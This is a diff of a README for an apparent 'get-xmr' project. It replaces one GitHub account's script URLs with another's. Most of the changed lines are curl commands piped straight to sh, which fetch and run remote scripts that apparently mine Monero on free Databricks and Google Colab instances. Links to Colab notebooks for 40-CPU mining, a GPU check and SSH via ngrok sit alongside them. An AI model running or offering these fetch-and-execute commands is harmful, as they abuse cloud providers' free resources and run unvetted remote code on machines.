@@ -1,24 +1,22 @@
-# Edit + Copy + Paste 👉🏻 [Click here for Tutorial](https://aank.me/Youtube)
-* Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
 ```markdown
 cd /root
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
+curl https://raw.githubusercontent.com/tranailam6996/get-xmr/main/databricks.sh | sh
 ```
-* Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
+* Try Free [XRDP GColab](https://colab.research.google.com/github/tranailam6996/get-xmr/blob/main/40CPU_getXMR.ipynb)
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
-```
-```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
+curl https://raw.githubusercontent.com/tranailam6996/get-xmr/main/gcolab-sg.sh | sh
 ```
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
+curl https://raw.githubusercontent.com/tranailam6996/get-xmr/main/gcolab-us.sh | sh
 ```
-* Try Free [40 CPU GColab to get XMR](https://bit.ly/GC-40cpu)
+```markdown
+curl https://raw.githubusercontent.com/tranailam6996/get-xmr/main/nvidiacolab-us.sh | sh
+```
+* Try Free [40 CPU GColab to get XMR](https://colab.research.google.com/github/tranailam6996/get-xmr/blob/main/40CPU_getXMR.ipynb)
  
-* Try Free [GPU Check](https://bit.ly/GPU-check)
+* Try Free [GPU Check](https://colab.research.google.com/github/tranailam6996/get-xmr/blob/main/SSH_GPU_CHECK.ipynb)
 
-* Try Free [SSH Using Ngrok](https://bit.ly/Ngrok-SSH)
+* Try Free [SSH Using Ngrok](https://colab.research.google.com/github/a2nk/get-xmr/blob/main/NGROK-SSH.ipynb)
 
 * Auto Reconnect GColab:
 ```markdown
